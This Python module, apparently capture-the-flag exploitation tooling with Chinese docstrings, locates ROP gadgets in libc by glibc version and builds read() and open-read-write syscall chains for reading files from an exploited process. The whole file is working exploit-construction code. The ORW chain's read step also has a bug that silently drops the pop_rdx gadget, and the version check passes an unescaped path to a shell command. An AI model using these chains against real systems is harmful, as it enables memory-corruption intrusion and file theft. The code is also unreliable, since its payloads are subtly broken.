from os import popen
from pwncli import *

class GadgetsDict(dict):
    def __init__(self, libc, ver, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.libc = libc
        self.ver = ver
    
    def __getitem__(self, key):
        if key not in self:
            self[key] = self._handle_missing_key(key)
        return super().__getitem__(key)
    
    def _handle_missing_key(self, key):
        gadgets = {
            'pop_rdi': b'_\xc3',
            'pop_rsi': b'^\xc3',
            'pop_rdx': b'Z\xc3',
            'pop_rax': b'X\xc3',
            'pop_r10': b'AZ\xc3',
            'pop_r8': b'AX\xc3',
            'pop_r9': b'AY\xc3',
            'pop_rcx': b'Y\xc3',
            'syscall': b'\x0f\x05\xc3',
            'leave_ret': b'\xc9\xc3',
            'ret': b'\xc3',
            '/bin/sh': b'/bin/sh\x00',
            '/bin/sh\x00': b'/bin/sh\x00',
            'sh': b'sh\x00',
            'sh\x00': b'sh\x00'
        }

        if key == 'pop_rdx_2':
            try:
                return next(self.libc.search(b'Z[\xc3', executable=True))
            except StopIteration:
                try:
                    return next(self.libc.search(b'ZA\\\xc3', executable=True))
                except StopIteration:
                    print(f'\033[31m[x] Gadgets ({key} ; ret) NOT FOUND. [X]\033[0m')
                    exit(0)

        if key == 'setcontext' or key == 'magic_gadget':
            if '2.27' in self.ver or '2.26' in self.ver or '2.25' in self.ver or '2.24' in self.ver or '2.23' in self.ver:
                try:
                    if key == 'setcontext':
                        return next(self.libc.search(b'H\x8b\xa7\xa0\x00\x00\x00H\x8b\x9f\x80\x00\x00\x00', executable=True))
                except StopIteration:
                    print('\033[31m[x] Gadgets (setcontext) NOT FOUND. [X]\033[0m')
                    exit(0)
            elif '2.29' in self.ver:
                try:
                    if key == 'setcontext':
                        return next(self.libc.search(b'H\x8b\xa2\xa0\x00\x00\x00H\x8b\x9a\x80\x00\x00\x00', executable=True))
                    elif key == 'magic_gadget':
                        return next(self.libc.search(b'H\x8bW\x08H\x8b\x07H\x89\xd7\xff\xe0', executable=True))
                except StopIteration:
                    print(f'\033[31m[x] Gadgets ({key}) NOT FOUND. [X]\033[0m')
                    exit(0)
            else:
                try:
                    if key == 'setcontext':
                        return next(self.libc.search(b'H\x8b\xa2\xa0\x00\x00\x00H\x8b\x9a\x80\x00\x00\x00', executable=True))
                    elif key == 'magic_gadget':
                        return next(self.libc.search(b'H\x8bW\x08H\x89\x04$\xffR ', executable=True))
                except StopIteration:
                    print(f'\033[31m[x] Gadgets ({key}) NOT FOUND. [X]\033[0m')
                    exit(0)

        if key in gadgets:
            try:
                if '/bin/sh' in key:
                    return next(self.libc.search(gadgets[key]))
                return next(self.libc.search(gadgets[key], executable=True))
            except StopIteration:
                if key == 'pop_rdx':
                    print('\033[33m[!] You may try to access pop_rdx_2 instead. [!]\033[0m')
                print(f'\033[31m[x] Gadgets ({key} ) NOT FOUND. [X]\033[0m')
                exit(0)
        else:
            print(f'\033[31m[x] Unsupported gadget key: {key}. [X]\033[0m')
            exit(0)

class GadgetsFinder:
    def __init__(self, libc:ELF, libcpath: string):
        '''
        传入两个参数，分别是libc对象和libc路径
        '''
        self.libc = libc
        self.libcpath = libcpath
        self.ver = self.__get_ver(self.libcpath)
        self.__gadgets = GadgetsDict(self.libc, self.ver)
    
    def __get_ver(self, filename):
        data = popen(f'strings "{filename}" | grep "GNU C Library"').read()
        try:
            ver = re.search(r'GLIBC (.*?)\)', data).group(1)
        except:
            print('[x] Cannot find GLIBC version! [x]')
            exit(0)
        return ver
    
    def __judge_rdx(self):
        try:
            _ = next(self.libc.search(b'Z\xc3', executable=True))
        except StopIteration:
            return 0
        return 1
    
    def get_gadgets(self) -> GadgetsDict:
        '''
        返回一个gadgets字典，使用如下方式调用：
        gadgets['pop_rdi']
        gadgets['leave_ret']
        ...
        '''
        return self.__gadgets
    
    def read(self, address, length=0x10, fd=0):
        rdx = self.__judge_rdx()
        gadgets = self.__gadgets

        payload = b''
        payload += p64(gadgets['pop_rax']) + p64(0)
        payload += p64(gadgets['pop_rdi']) + p64(fd)
        payload += p64(gadgets['pop_rsi']) + p64(address)
        if rdx:
            payload += p64(gadgets['pop_rdx']) + p64(length)
        else:
            payload += p64(gadgets['pop_rdx_2']) + p64(length) + p64(0)
        payload += p64(gadgets['syscall'])
        return payload
    
    def ropchain(self, file_address, file_fd=3, type='standard', orw='orw') -> bytes:
        '''
        返回orw的ropchain。
        file_address: 文件名的存放地址
        file_fd: 欲读取文件的fd
        type: 'short'为短payload，standard为标准payload
        orw: 'orw'使用open+read+write，'sendfile'使用open+sendfile
        return: 返回一个payload字节串
        '''
        if orw == 'orw':
            rdx = self.__judge_rdx()
            gadgets = self.__gadgets
            payload = b''

            # open
            payload += p64(gadgets['pop_rdi']) + p64(file_address) + p64(gadgets['pop_rax']) + p64(2)
            if type == 'standard':
                payload += p64(gadgets['pop_rsi']) + p64(0)
                if rdx:
                    payload += p64(gadgets['pop_rdx']) + p64(0)
                else:
                    payload += p64(gadgets['pop_rdx_2']) + p64(0) + p64(0)
            payload += p64(gadgets['syscall'])

            # read
            payload += p64(gadgets['pop_rax']) + p64(0) + p64(gadgets['pop_rdi']) + p64(file_fd)
            payload += p64(gadgets['pop_rsi']) + p64(self.libc.address - 0x100) 
            if rdx:
                p64(gadgets['pop_rdx']) + p64(0x100)
            else:
                payload += p64(gadgets['pop_rdx_2']) + p64(0x100) + p64(0)
            payload += p64(gadgets['syscall'])

            # write
            payload += p64(gadgets['pop_rax']) + p64(1) + p64(gadgets['pop_rdi']) + p64(1)
            if type == 'standard':
                payload += p64(gadgets['pop_rsi']) + p64(self.libc.address - 0x100)
                if rdx:
                    payload += p64(gadgets['pop_rdx']) + p64(0x100)
                else:
                    payload += p64(gadgets['pop_rdx_2']) + p64(0x100) + p64(0)
            payload += p64(gadgets['syscall'])
            return payload
        else:
            print(f'\033[31m[x] The author has not implemented the methods but orw yet. [X]\033[0m')
            exit(0)

